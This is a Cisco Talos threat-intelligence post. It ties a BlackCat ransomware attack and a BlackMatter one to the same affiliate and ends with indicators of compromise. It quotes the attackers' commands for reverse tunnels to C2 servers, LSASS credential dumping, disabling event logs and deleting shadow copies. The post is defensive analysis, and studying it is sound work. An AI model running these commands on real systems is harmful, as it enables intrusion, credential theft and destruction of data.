<div>
<a name="6970460627068478444"></a>
<h1 class="post-title entry-title">
From BlackMatter to BlackCat: Analyzing two attacks from one affiliate
</h1>
<a href="https://blogger.googleusercontent.com/img/a/AVvXsEhzwkBRlrKVbcbjQZW7UTdTDN_lOlftYwti5ZeUDtJ9doEDnG4jDcX0YZUPz5B76riSHGEvj5SHOBHNo1whFzEiXOpKuG0ec-Von0saSFrEnwZ3mBRhfyY8xn7_Aps-CsJNV3pD7sgOcfd5RIYtPyh244YfVUnpvkg1Lkcj5q3PZeAckg3Fa38vr3tB5Q=s3000"><img border="0" src="https://blogger.googleusercontent.com/img/a/AVvXsEhzwkBRlrKVbcbjQZW7UTdTDN_lOlftYwti5ZeUDtJ9doEDnG4jDcX0YZUPz5B76riSHGEvj5SHOBHNo1whFzEiXOpKuG0ec-Von0saSFrEnwZ3mBRhfyY8xn7_Aps-CsJNV3pD7sgOcfd5RIYtPyh244YfVUnpvkg1Lkcj5q3PZeAckg3Fa38vr3tB5Q=s16000" style="max-width:80%;height:auto;width:auto;"/></a>
By <a href="https://www.google.com/url?q=https://twitter.com/t14g0p&amp;sa=D&amp;source=editors&amp;ust=1647513308801848&amp;usg=AOvVaw0ozbVStNxyGY0r-JfzMc6r">Tiago Pereira</a> with contributions from <a href="https://www.google.com/url?q=https://twitter.com/hueylittle_er&amp;sa=D&amp;source=editors&amp;ust=1647513308802118&amp;usg=AOvVaw1rDMnlWuNOhTrMick_Zb_0">Caitlin Huey</a>.
<ul>
<li>
BlackCat is a recent and growing ransomware-as-a-service (RaaS) group that targeted several organizations worldwide over the past few months.</li>
<li>
There are rumors of a relationship between BlackCat and the BlackMatter/DarkSide ransomware groups, infamous for <a href="https://www.google.com/url?q=https://www.bloomberg.com/news/articles/2021-06-04/hackers-breached-colonial-pipeline-using-compromised-password&amp;sa=D&amp;source=editors&amp;ust=1647513308802538&amp;usg=AOvVaw37uzheC5fS_U15ft9Jm5i_">attacking the Colonial Pipeline last year</a>. According to a BlackCat representative, BlackCat is not a rebranding of BlackMatter, but its team is made from affiliates of other RaaS groups (including BlackMatter). </li>
<li>
Talos has observed at least one attacker that used BlackMatter was likely one of the early adopters of BlackCat. In this post, we'll describe these attacks and the relationship between them.</li>
<li>
Understanding the techniques and tools used by RaaS affiliates helps organizations detect and prevent attacks before the ransomware itself is executed, at which point, every second means lost data.</li></ul>
<a name="more"></a>
BlackCat ransomware, also known as "ALPHV," has quickly gained notoriety for being used in double ransom (encrypted files and stolen file disclosure) attacks against companies. It first appeared in November 2021 and, since then, several companies have been <a href="https://www.google.com/url?q=https://www.zdnet.com/article/billion-dollar-logistics-giant-expeditors-struggling-to-recover-from-cyberattack/&amp;sa=D&amp;source=editors&amp;ust=1647513308803008&amp;usg=AOvVaw2yzO761_G7R4ZvhwQm9Gql">hit across the globe</a>. However, more than 30 percent of the compromises happened to U.S.-based companies.
<a href="https://blogger.googleusercontent.com/img/a/AVvXsEiwpA0zuQ56FqIVYxn9YyzEE-53kBtNdtI6wNtQ9NSda5zlLmBjAxBfT9FJmnIzo9lCyf3ee78mPOxV-SgzG7QwSEmz0wnVFLzckiGneqM1Bvs72ECWAc7mzcHjDJ_t7-xilltOf2VFLlSs515-DLQw_UZ0qkVED7s8L6Cx_XoQep734n8awvDUsKTW4g=s2253"><img border="0" src="https://blogger.googleusercontent.com/img/a/AVvXsEiwpA0zuQ56FqIVYxn9YyzEE-53kBtNdtI6wNtQ9NSda5zlLmBjAxBfT9FJmnIzo9lCyf3ee78mPOxV-SgzG7QwSEmz0wnVFLzckiGneqM1Bvs72ECWAc7mzcHjDJ_t7-xilltOf2VFLlSs515-DLQw_UZ0qkVED7s8L6Cx_XoQep734n8awvDUsKTW4g=s16000" style="max-width:80%;height:auto;width:auto;"/></a>
Several security companies have noticed a connection between the BlackCat, BlackMatter and DarkSide ransomware groups. Recently, in a Recorded Future <a href="https://www.google.com/url?q=https://therecord.media/an-alphv-blackcat-representative-discusses-the-groups-plans-for-a-ransomware-meta-universe/&amp;sa=D&amp;source=editors&amp;ust=1647513308803579&amp;usg=AOvVaw17UXCOc6CZ5rfH1eO_m-4p">interview</a> with a BlackCat representative, the representative confirmed that there was a connection, but no rebranding or other direct relationship. 
The BlackCat representative explained that the operators are instead affiliates of other RaaS operations and the actors built upon a foundation of their previous knowledge gained as part of other groups. Affiliates in this context are the groups that compromise companies' networks and deploy the ransomware provided by the RaaS operators.
If this is true, BlackCat seems to be a case of vertical business expansion. In essence, it's a way to control the upstream supply chain by making a service that is key to their business (the RaaS operator) better suited for their needs and adding another source of revenue. 
Vertical expansion is also a common business strategy when there is a lack of trust in the supply chain. There are several cases of vulnerabilities in ransomware encryption, and even of backdoors that can explain a lack of trust in RaaS. One particular case mentioned by the BlackCat representative, was a <a href="https://www.google.com/url?q=https://blog.emsisoft.com/en/39181/on-the-matter-of-blackmatter/&amp;sa=D&amp;source=editors&amp;ust=1647513308804241&amp;usg=AOvVaw2IJqvHbl9Y8cpPY6Q1oe73">flaw</a> in DarkSide/BlackMatter ransomware allowing victims to decrypt their files without paying the ransom. Victims used this vulnerability for several months, resulting in big losses for affiliates.
<h2 id="h.lstd89e9potl">
</h2><h2 id="h.lstd89e9potl">
</h2><h2 id="h.lstd89e9potl">BlackCat/BlackMatter connection</h2>
While researching a BlackCat ransomware attack from December 2021, we observed a domain (and respective IP addresses) used to maintain persistent access to the network. This domain had also been used in a BlackMatter attack in September 2021. Further analysis revealed more commonalities, such as tools, file names and techniques that were common to both ransomware variants.
Affiliates are responsible for compromising systems and deploying ransomware, so it is likely that attacks carried out by the same ransomware family may differ in techniques and procedures. On the other hand, RaaS operators are known to make training materials and general techniques and tools available to their affiliates, like the leaked Conti ransomware playbook covered by Talos in a previous <a href="https://www.google.com/url?q=https://blog.talosintelligence.com/2021/09/Conti-leak-translation.html&amp;sa=D&amp;source=editors&amp;ust=1647513308804967&amp;usg=AOvVaw3iM1-jpjE9a4dD7sQ6MKPh">blog</a>. This may suggest there are some similarities across affiliates. 
One difference we would expect to see across RaaS affiliates is the command and control (C2) infrastructure used for certain attacks. However, the overlapping C2 address found used in the BlackMatter and BlackCat attacks lead us to assess with moderate confidence that the same affiliate was responsible for both attacks.
This connection suggests that a BlackMatter affiliate was likely an early adopter — possibly in the first month of operation — of BlackCat. This is further evidence to support the rumors that there are strong ties between BlackMatter and BlackCat.
<h2 id="h.ux8sa94oaet9">
</h2><h2 id="h.ux8sa94oaet9">
</h2><h2 id="h.ux8sa94oaet9">Attack details</h2>
We analyzed the actions taken by what we believe to be the same affiliate/attackers in the December BlackCat attack and a September BlackMatter attack. In terms of attack flow, the attacks were similar to other human-operated ransomware attacks: initial compromise, followed by an exploration and data exfiltration phase, then attack preparation and finally, the attack execution.
<a href="https://blogger.googleusercontent.com/img/a/AVvXsEiLDZUvhJrTtFf2TSVL3LhqkvbhCw2VhpHdQLoCGP3vcjd7LWQ5_oUO7B3PUERd_Cs64snL97SAJvpJbM7DvXU9m6W3FqdX2uZ0WHtGkTBCGXVgSEaOy933I-Twgkng-u9i7Bnx7agz0FsQFEHsjWSZs5n8_BEHj9nCEIPD38Yf_yKW91mZd0_-ihWMuA=s2298"><img border="0" src="https://blogger.googleusercontent.com/img/a/AVvXsEiLDZUvhJrTtFf2TSVL3LhqkvbhCw2VhpHdQLoCGP3vcjd7LWQ5_oUO7B3PUERd_Cs64snL97SAJvpJbM7DvXU9m6W3FqdX2uZ0WHtGkTBCGXVgSEaOy933I-Twgkng-u9i7Bnx7agz0FsQFEHsjWSZs5n8_BEHj9nCEIPD38Yf_yKW91mZd0_-ihWMuA=s16000" style="max-width:80%;height:auto;width:auto;"/></a>
The following table summarizes the commonalities and differences in the MITRE ATT&amp;CK® framework between both attacks:
<a href="https://blogger.googleusercontent.com/img/a/AVvXsEg1dBP0ZrNSJcqcrAC7p-nPaZ0ZwQaZ0PqWzFGiFizSEnFA7QteEiLB2HlPVvqj6KKYPWFkLpU_nDOMdS4XXp8Hhr3K-2hEgSezB3FwkBfA2FVV7zd9rMQeVNo2w64_rnCda3YArBnLdZCE4O2ZMDOa2XqX9_0Yy1zTFi4aXkeV2AUicFIk5cmVEFE0bA=s3188"><img border="0" src="https://blogger.googleusercontent.com/img/a/AVvXsEg1dBP0ZrNSJcqcrAC7p-nPaZ0ZwQaZ0PqWzFGiFizSEnFA7QteEiLB2HlPVvqj6KKYPWFkLpU_nDOMdS4XXp8Hhr3K-2hEgSezB3FwkBfA2FVV7zd9rMQeVNo2w64_rnCda3YArBnLdZCE4O2ZMDOa2XqX9_0Yy1zTFi4aXkeV2AUicFIk5cmVEFE0bA=s16000" style="max-width:80%;height:auto;width:auto;"/></a>
<h3 id="h.wnxb7tcmaneg">
</h3><h3 id="h.wnxb7tcmaneg">Initial access</h3>
We could not identify the initial compromise vector for the BlackCat attack. It is likely that the attack happened on a system not monitored by Cisco Talos telemetry or that a previously compromised account was used to log into an exposed system.
There was evidence in the BlackMatter attack that the actor established initial access via the possible exploitation of Microsoft Exchange vulnerabilities. However, we could not directly tie attempts of exploiting vulnerabilities in Microsoft Exchange to the attack and, for this reason, we assess with low confidence that the attack may have started with the exploitation of a vulnerability in Exchange.
<h3 id="h.3omxvje2gdc5">
</h3><h3 id="h.3omxvje2gdc5">Persistence</h3>
Beyond the access provided by the first exploitation vector, the attackers made sure they had additional remote access to several internal systems. 
During the BlackCat attack, the actors used a tool called <a href="https://www.google.com/url?q=https://github.com/Fahrj/reverse-ssh&amp;sa=D&amp;source=editors&amp;ust=1647513308806628&amp;usg=AOvVaw3dMZRdlDPOdzpw7mx5obbm">reverse-ssh</a>, compiled with the C2 server address embedded, to set up reverse SSH tunnels and provide reverse shells to the attacker. Reverse-ssh was deployed to C:\ directory and named: system, Windows or cache task.
It was also observed hidden by writing to an alternate data stream (ADS) of the C:\ directory using the following command:
c:\windows\system32\windowspowershell\v1.0\powershell.exe -command &amp; {(get-content c:\system -raw | set-content c:\ -stream 'cachetask')}c:\windows\system32\schtasks.exe /create /ru system /sc minute /tn microsoft\windows\wininet\cachetask /tr c:\:cachetask -b &lt;bind port&gt; /f<p>c:\windows\system32\schtasks.exe /run /tn microsoft\windows\wininet\cachetask</p>
The “image file execution option” debugger registry key was another way to ensure the malicious file would be persistently executed on the system:
<p>c:\windows\system32\reg.exe add hklm\software\microsoft\windows nt\currentversion\image file execution options\taskmgr.exe /v debugger /t reg_sz /d c:\system</p>
During the BlackMatter attack, the group used a similar technique but with a different tool: GO Simple Tunnel (GOST). G<a href="https://www.google.com/url?q=https://v2.gost.run/&amp;sa=D&amp;source=editors&amp;ust=1647513308807736&amp;usg=AOvVaw1OcMAq9JQfEju3U0DWuNuw">OST</a> is a Go-based tunneling tool that was used to establish a reverse SSH tunnel to an attacker-controlled C2 server. This C2 server is the same that was used in the BlackCat attack. The name used for the deployed Gost file was "system.exe", similar to the file name used in the BlackCat attack for reverse-ssh.
<p>cmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows wsus update /tr c:\windows\temp\system.exe -l socks5://127.0.0.1:3388 /st 12:00 /f
cmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows defender /tr c:\windows\temp\system.exe -l rtcp://0.0.0.0:1116/127.0.0.1:3388 -f mwss://52[.]149[.]228[.]45:443 /st 12:00 /f
cmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows wsus update /tr c:\windows\temp\system.exe -l socks5://127.0.0.1:3388 /st 12:00 /f
cmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows defender /tr c:\windows\temp\system.exe -l rtcp://0.0.0.0:1117/127.0.0.1:3388 -f mwss://20[.]46[.]245[.]56:443 /st 12:00 /f</p>
The same C2 domain was used in both attacks:
<a href="https://blogger.googleusercontent.com/img/a/AVvXsEhDtmGSAbVdeF4IbcTMCZz26i223ejazfZ-aHpHxopqdMV8EKNcw0AVFiyMxNML3O-AObx8vea2fI8qvJxdtZfqhPytF0GslcTBVLZH22BhjintfbQIywN-O8Y6eyFYnYYKWbaueMOctPAYYmyUw5z5-WEu2rMnsU0nn1LEts3wolYkADMM5zE-h-kKjQ=s2708"><img border="0" src="https://blogger.googleusercontent.com/img/a/AVvXsEhDtmGSAbVdeF4IbcTMCZz26i223ejazfZ-aHpHxopqdMV8EKNcw0AVFiyMxNML3O-AObx8vea2fI8qvJxdtZfqhPytF0GslcTBVLZH22BhjintfbQIywN-O8Y6eyFYnYYKWbaueMOctPAYYmyUw5z5-WEu2rMnsU0nn1LEts3wolYkADMM5zE-h-kKjQ=s16000" style="max-width:80%;height:auto;width:auto;"/></a><h3 id="h.feqkffee2fxd">Defense evasion</h3>
During the BlackCat attack, logs were disabled on several systems to avoid detection. For example, before setting up the reverse-ssh scheduled task tool attackers disabled logs for the task scheduler (a full list of disabled logs is provided in the IOC section below).
<p>c:\windows\system32\wevtutil.exe set-log microsoft-windows-taskscheduler/operational /enabled:false</p>
The anti-rootkit tool <a href="https://www.google.com/url?q=http://www.gmer.net/?m%3D0&amp;sa=D&amp;source=editors&amp;ust=1647513308809386&amp;usg=AOvVaw3rvdJ3sbN00fi9FE7ZBArk">Gmer</a> was loaded into a small number of key systems. We believe the attackers used this to disable endpoint protection.
<p>c:\users\&lt;username&gt;\downloads\gmer\gmer.exe</p>
<h3 id="h.3oph9r13caji">
</h3><h3 id="h.3oph9r13caji">Credential access</h3>
Local and domain user credentials were collected, on a few key systems, by dumping the LSASS process memory and extracting credentials with Microsoft Sysinternals <a href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/sysinternals/downloads/procdump&amp;sa=D&amp;source=editors&amp;ust=1647513308809942&amp;usg=AOvVaw1b2f46JCmTJ3V0tL1J9XC4">Procdump</a> and <a href="https://www.google.com/url?q=https://github.com/outflanknl/Dumpert&amp;sa=D&amp;source=editors&amp;ust=1647513308810101&amp;usg=AOvVaw2pqhgpoaC7FNpU0g2m8rmI">Dumpert</a>:
<p>c:\windows\system\procdump.exe -accepteula -ma lsass.exe lsass.dmp</p> <p>c:\windows\system\dumpert.exe lsass.exe</p>
During the BlackMatter attack, the attacker used comsvcs.dll directly to dump LSASS memory: 
<p>powershell rundll32.exe c:\windows\system32\comsvcs.dll, minidump (get-process lsass).id c:\temp\lsass.dmp full</p>
Beyond the Windows login credentials, during the BlackCat attack, the attackers used a tool named "steal.exe" to harvest additional data. We could not obtain the binary, but based on the creation of a results folder with an "archive.zip" file inside it, we believe the tool may be <a href="https://www.google.com/url?q=https://github.com/moonD4rk/HackBrowserData&amp;sa=D&amp;source=editors&amp;ust=1647513308811062&amp;usg=AOvVaw0NnwQ5SUx6ZclAIabgKA3E">HackBrowserData</a>, or a version of it.
The following commands were used on a few systems:
<p>cmd.exe /q /c steal.exe 1&gt; \\127.0.0.1\admin$\__&lt;num&gt;.&lt;num&gt; 2&gt;&amp;1
cmd.exe /q /c cd results 1&gt; \\127.0.0.1\admin$\__&lt;num&gt;.&lt;num&gt; 2&gt;&amp;1
cmd.exe /q /c dir 1&gt; \\127.0.0.1\admin$\__&lt;num&gt;.&lt;num&gt; 2&gt;&amp;1 
cmd.exe /q /c del archive.zip 1&gt; \\127.0.0.1\admin$\__&lt;num&gt;.&lt;num&gt; 2&gt;&amp;1
cmd.exe /q /c del c:\steal.exe 1&gt; \\127.0.0.1\admin$\__&lt;num&gt;.&lt;num&gt; 2&gt;&amp;1</p><h3 id="h.fiqxo3mlb0iw">
</h3><h3 id="h.fiqxo3mlb0iw">Discovery</h3>
During the BlackCat attack, we observed network scanning and reconnaissance using <a href="https://www.google.com/url?q=https://www.softperfect.com/products/networkscanner/&amp;sa=D&amp;source=editors&amp;ust=1647513308812407&amp;usg=AOvVaw1E7ojK7_bE5XWmXquUqS7v">so</a><a href="https://www.google.com/url?q=https://www.softperfect.com/products/networkscanner/&amp;sa=D&amp;source=editors&amp;ust=1647513308812562&amp;usg=AOvVaw3nuK7JlPancaktWco5wqg7">ftperfect n</a><a href="https://www.google.com/url?q=https://www.softperfect.com/products/networkscanner/&amp;sa=D&amp;source=editors&amp;ust=1647513308812711&amp;usg=AOvVaw2Nm7MRzizrRqPDOW-cJq_M">etwork scanner</a>. This tool has many features beyond simple network scanning and was probably a valuable tool in understanding systems roles and network infrastructure and possible lateral movement. The following commands show this tool in use. Notice that the name of the executable has been changed to make it blend into the system's regular processes.<h3 dir="ltr">cmd.exe /c c:\programdata\system\svchost.exe /hide /auto:c:\programdata\system\192.xml /range:192.168.0.0-192.168.255.255
c:\programdata\system\svchost.exe /hide /auto:c:\programdata\system\192.xml /range:192.168.0.0-192.168.255.255
cmd.exe /c c:\programdata\system\svchost.exe /hide /auto:c:\programdata\system\192.xml /range:192.168.0.0-192.168.255.255</h3>
ADRecon was also used to collect information from Active Directory and its key servers. 
<p>c:\windows\system32\windowspowershell\v1.0\powershell.exe -exec bypass .\adrecon.ps1</p>
During the BlackMatter attack, the attackers also searched for additional ways to maintain access. For example, the following command shows the attackers exploring an existing TeamViewer installation:
<p>cmd.exe /q /c teamviewer.exe --getid
cmd.exe /q /c dir c:"program files 
cmd.exe /q /c dir c:"program files (x86) 1
cmd.exe /q /c dir c:"program files (x86)\teamviewer\
cmd.exe /q /c c:"program files (x86)\teamviewer\teamviewer.exe --getid</p><p>cmd.exe /q /c c:"program files (x86)\teamviewer\teamviewer.exe -info </p>
The following commands show the attackers exploring the keepass password manager config:
<p>cmd.exe /q /c dir c:"program files (x86)\</p><p>cmd.exe /q /c dir c:"program files (x86)"keepass password safe 2\</p><p>cmd.exe /q /c type c:"program files (x86)"keepass password safe 2\keepass.exe.config </p>
<h3 id="h.5pgljcbsbqi1">
</h3><h3 id="h.5pgljcbsbqi1">Lateral movement</h3>
We observed lateral movement using three main tools and techniques, including <a href="https://www.google.com/url?q=https://github.com/SecureAuthCorp/impacket&amp;sa=D&amp;source=editors&amp;ust=1647513308815173&amp;usg=AOvVaw0J5ExBm0XnrymkRAcHUPad">Impacket</a>'s wmiexec, PowerShell using WinRM service and Microsoft Remote Desktop.
<a href="https://www.google.com/url?q=https://github.com/SecureAuthCorp/impacket&amp;sa=D&amp;source=editors&amp;ust=1647513308815448&amp;usg=AOvVaw0UneQwYYA1gijAOtqPy1yQ">Impacket</a>'s WMIExec provides a shell on remote systems that have the WMI service exposed. We observed its use in both the BlackCat and BlackMatter attacks. This tool's activity can be detected by detecting processes created by wmipsrv.exe that terminate with the following string:
<p>1&gt; \\127.0.0.1\admin$\__&lt;timestamp&gt;.&lt;6 digits&gt; 2&gt;&amp;1</p>
This tool was often used to issue a command to allow WinRM service network connections through the firewall, possibly for the convenience of using some prepared scripts:
<p>cmd.exe /q /c netsh advfirewall firewall add rule name=service dir=in protocol=tcp localport=5985 action=permit 1&gt; \\127.0.0.1\c$\windows\temp\qaiumg 2&gt;&amp;1</p>
WinRM allows attackers to use PowerShell to execute commands on remote machines. This tool can be detected by searching for processes started by "wsmprovhost.exe". Below, there's a few examples of WinRM being used for lateral movement, in this case, to disable logging of many Windows services: 
<p>c:\windows\system32\wevtutil.exe set-log active directory web services /enabled:false</p><p>c:\windows\system32\wevtutil.exe set-log application /enabled:false</p><p>c:\windows\system32\wevtutil.exe set-log hardwareevents /enabled:false</p><p>c:\windows\system32\wevtutil.exe set-log internet explorer /enabled:false</p>
Microsoft Remote Desktop was also used by the attackers to obtain GUI access to systems. The following impacket command was issued before the adversary could gain remote admin access.
<p>cmd.exe /q /c reg add hkey_local_machine\system\currentcontrolset\control\lsa /v disablerestrictedadmin /t reg_dword /d 0 1&gt; \\127.0.0.1\admin\$\__&lt;timestamp&gt;\.&lt;num&gt; 2&gt;&amp;1</p>
Other lateral movement techniques observed include PsEexec on both attacks and RemCom — an open-source version of psexec — during the BlackMatter attack.
<h3 id="h.9ac83avou5w5">
</h3><h3 id="h.9ac83avou5w5">Command and control</h3>
Interestingly, due to what seems to be an OPSEC mistake using the attacker's shell upload and download command, they revealed the use of Kali Linux to execute remote commands.
<p>cmd.exe /q /c #upload c:\users\&lt;user&gt;\documents\&lt;doc&gt; /home/kali/desktop/&lt;doc&gt; 1&gt; \\127.0.0.1\admin$\&lt;num&gt;.&lt;num&gt; 2&gt;&amp;1</p><p>cmd.exe /q /c #download c:\users\&lt;user&gt;\documents\&lt;doc&gt; /home/kali/desktop/&lt;doc&gt; 1&gt; \\127.0.0.1\admin$\&lt;num&gt;.&lt;num&gt; 2&gt;&amp;1</p>
It is unlikely that the attackers had a Kali Linux installation inside the victim's network, so remote control of the systems was likely achieved through the SSH tunnels described earlier.
<h3 id="h.5fxq7kplpsau">
</h3><h3 id="h.5fxq7kplpsau">Exfiltration</h3>
Although we observed a suspiciously large number of documents opened and screenshots taken from one of the compromised systems, we did not identify techniques used to exfiltrate data from the network. It is possible that document exfiltration is carried out by the execution of upload/download commands similar to the ones listed above.
<h3 id="h.yw87c081uofb">
</h3><h3 id="h.yw87c081uofb">Impact</h3>
In both attacks, before the actual execution of the ransomware, the attackers performed several actions preparing systems to make the execution as successful as possible. On the day of the attack, the attacker logged in to the domain controller and opened the group policy management interface. The attackers then dropped and executed a file named "apply.ps1." We believe this script created and prepared the group policy to cause the execution of the ransomware throughout the domain.
<p>c:\windows\system32\windowspowershell\v1.0\powershell.exe -exec bypass .\apply.ps1</p>
This execution results in the immediate writing of group policy files to disk and is followed by the execution of the following command to force the deployment of the group policy:
<p>cmd.exe /q /c gpupdate /force</p>
A few minutes before BlackCat ransomware started encrypting files, the attackers executed a script called "defender.vbs": 
<p>cmd.exe /c \\&lt;domaincontroller&gt;\netlogon\defender.vbs</p>
In the BlackMatter attack, the exact same file was named "def.vbs" and executed minutes before the encryption began:
<p>cmd.exe /c \\&lt;domaincontroller&gt;\netlogon\def.vbs</p>
We believe this is part of the attack, but at this time do not know the exact role of this script. 
When encryption begins, the ransomware file named &lt;num&gt;.exe in the BlackCat attack and, similarly, &lt;num&gt;.exe in the BlackMatter attack, was dropped on the domain servers inside the SYSVOL folder, making it accessible on the NETLOGON network share, accessible by all users in the domain. File encryption makes all systems execute these files from the remote share.
BlackCat attack:
<p>cmd.exe -c \\&lt;domain controller&gt;\netlogon\&lt;num&gt;.exe --access-token &lt;token&gt;</p>
BlackMatter attack:
<p>cmd.exe -c \\&lt;domain controller&gt;\netlogon\&lt;num&gt;.exe</p>
The following variations of the BlackCat command were observed:
<p>&lt;num&gt;.exe --access-token &lt;token&gt; /f</p><p>&lt;num&gt;.exe --access-token &lt;token&gt; --no-prop-servers \\&lt;hostname&gt; --propagated</p><p>&lt;num&gt;.exe -access-token &lt;token&gt; -v -p \\&lt;hostname&gt;\scans</p><p>&lt;num&gt;.exe --access-token &lt;token&gt;</p><p>&lt;num&gt;.exe --child --access-token &lt;token&gt;</p><p>&lt;num&gt;.exe -access-token &lt;token&gt; -v -p .</p>
The BlackCat executable deployed other commands to make its execution more effective:
<p>c:\windows\system32\cmd.exe /c fsutil behavior set symlinkevaluation r2l:1</p><p>c:\windows\system32\cmd.exe /c reg add hkey_local_machine\system\currentcontrolset\services\lanmanserver\parameters /v maxmpxct /d 65535 /t reg_dword /f
c:\windows\system32\cmd.exe /c fsutil behavior set symlinkevaluation r2r:1
c:\windows\system32\cmd.exe /c vssadmin.exe delete shadows /all /quiet
c:\windows\system32\cmd.exe /c wmic.exe shadowcopy delete
c:\windows\system32\cmd.exe /c arp -a
c:\windows\system32\cmd.exe /c bcdedit /set {default}
c:\windows\system32\cmd.exe /c cmd.exe /c for /f "tokens=*" %1 in ('wevtutil.exe el') do wevtutil.exe cl "%1"
c:\windows\system32\cmd.exe /c bcdedit /set {default} recoveryenabled no
</p>
<h2 id="h.13680srhqy83">Conclusion</h2>
BlackCat first surfaced in November 2021, with the attack we described here taking place in December 2021. While we don't know how related BlackCat is to BlackMatter, we assess with moderate confidence that based on the tools and techniques of these attacks and overlapping infrastructure, BlackMatter affiliates were likely among the early adopters of BlackCat. 
As we have seen several times before, RaaS services come and go. Their affiliates, however, are likely to simply move on to a new service. And with them, many of the TTPs are likely to persist.
One key aspect of these attacks is that adversaries take time exploring the environment and preparing it for a successful and broad attack before launching the ransomware, at which point every second means lost data. Therefore, it is key that the attack is detected in its early stages. 
The two attacks described here took over 15 days to reach the encryption stage. Knowing the attackers tools and techniques and having monitoring and response processes in place could have prevented the successful encryption of the companies files.
Talos will continue to monitor RaaS and their affiliates activities and provide intelligence, detection rules and indicators to help defenders as they work to protect their networks.
<h2 id="h.50xe789nu4q">IOCs</h2>
<h5 id="h.7pbyfa7zv56m">Domains - Common:</h5>
windows[.]menu
<h5 id="h.gvc0r292s6ud">IP's - Common:</h5>
52.149.228[.]45
20.46.245[.]56
<h5 id="h.m7us21mw9cqu">Hashes - Common:</h5>
Apply.ps1 
D97088F9795F278BB6B732D57F42CBD725A6139AFE13E31AE832A5C947099676
defender.vbs
B54DD21019AD75047CE74FE0A0E608F56769933556AED22D25F4F8B01EE0DA15
<h5 id="h.6narnj6exok">Hashes - BlackCat:</h5>
Reverse-ssh (compiled with hardcoded domain):
47AFFAED55D85E1EBE29CF6784DA7E9CDBD86020DF8B2E9162A0B1A67F092DCD
stealer:
65DBAFE9963CB15CE3406DE50E007408DE7D12C98668DE5DA10386693AA6CD73
Blackcat ransomware:
060CA3F63F38B7804420729CDE3FC30D126C2A0FFC0104B8E698F78EDAB96767
<h5 id="h.xqjl4hkzhudl">Hashes - BlackMatter:</h5>
BlackMatter ransomware:
706F3EEC328E91FF7F66C8F0A2FB9B556325C153A329A2062DC85879C540839D
<h2 id="h.4y4i21630gjn">Coverage</h2>
Ways our customers can detect and block this threat are listed below.<a href="https://blogger.googleusercontent.com/img/a/AVvXsEhqNvw2zggZ1WFeilVvk6X3OqIan6QgpV5x9svHU13O9l3b5NEWsrd0E1m_eFMnM498KXR7INYmom2L6VwF9EwN6vGQrvnUB0mVouY-kKwinm8iCTNmBGztQ1Dnt_lF-sZVcXt8JE8wjpmF5oLgtbGFV_TsbbWQyx-oGNvzGA_jXrHsySHphIVLwti1qA=s1196"><img border="0" src="https://blogger.googleusercontent.com/img/a/AVvXsEhqNvw2zggZ1WFeilVvk6X3OqIan6QgpV5x9svHU13O9l3b5NEWsrd0E1m_eFMnM498KXR7INYmom2L6VwF9EwN6vGQrvnUB0mVouY-kKwinm8iCTNmBGztQ1Dnt_lF-sZVcXt8JE8wjpmF5oLgtbGFV_TsbbWQyx-oGNvzGA_jXrHsySHphIVLwti1qA=s16000" style="max-width:80%;height:auto;width:auto;"/></a>
<a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html&amp;sa=D&amp;source=editors&amp;ust=1647513308824440&amp;usg=AOvVaw0qifKByMKp0HoK69IZwbdh">Cisco Secure Endpoint</a> (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free <a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Damp-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Damp-free-trial&amp;sa=D&amp;source=editors&amp;ust=1647513308824757&amp;usg=AOvVaw0beu6cbENKWBiPBD8tSN6T">here.</a>
<a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/firewalls/index.html&amp;sa=D&amp;source=editors&amp;ust=1647513308825051&amp;usg=AOvVaw0A5zx7AOnEoklRQPPFmZDr">Cisco Secure Firewall</a> (formerly Next-Generation Firewall and Firepower NGFW) appliances such as <a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/collateral/security/firepower-ngfw-virtual/datasheet-c78-742858.html&amp;sa=D&amp;source=editors&amp;ust=1647513308825259&amp;usg=AOvVaw1CZFtQsXT-89C4SLV4RLpY">Threat Defense Virtual</a>, <a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html&amp;sa=D&amp;source=editors&amp;ust=1647513308825446&amp;usg=AOvVaw3vBFEOb8mPR0FxyVA0kwB9">Adaptive Security Appliance</a> and <a href="https://www.google.com/url?q=https://meraki.cisco.com/products/appliances&amp;sa=D&amp;source=editors&amp;ust=1647513308825602&amp;usg=AOvVaw3g36Zil9w4ZEUyWNdi2KxK">Meraki MX</a> can detect malicious activity associated with this threat.
<a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/stealthwatch/index.html&amp;sa=D&amp;source=editors&amp;ust=1647513308825907&amp;usg=AOvVaw2f7kTATFX7t6fhTZdhYHju">Cisco Secure Network/Cloud Analytics</a> (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device.
<a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/threat-grid/index.html&amp;sa=D&amp;source=editors&amp;ust=1647513308826161&amp;usg=AOvVaw061F7oXG5sB_0_v8PjkBFL">Cisco Secure Malware Analytics</a> (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.
<a href="https://www.google.com/url?q=https://umbrella.cisco.com/&amp;sa=D&amp;source=editors&amp;ust=1647513308826422&amp;usg=AOvVaw2SRdZJn5gSDNHjsBsckyBs">Umbrella</a>, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella <a href="https://www.google.com/url?q=https://signup.umbrella.com/?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Dumbrella-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Dautomated-free-trial&amp;sa=D&amp;source=editors&amp;ust=1647513308826710&amp;usg=AOvVaw1xsYkXwOdniP9VkVWoFvbO">here</a>.
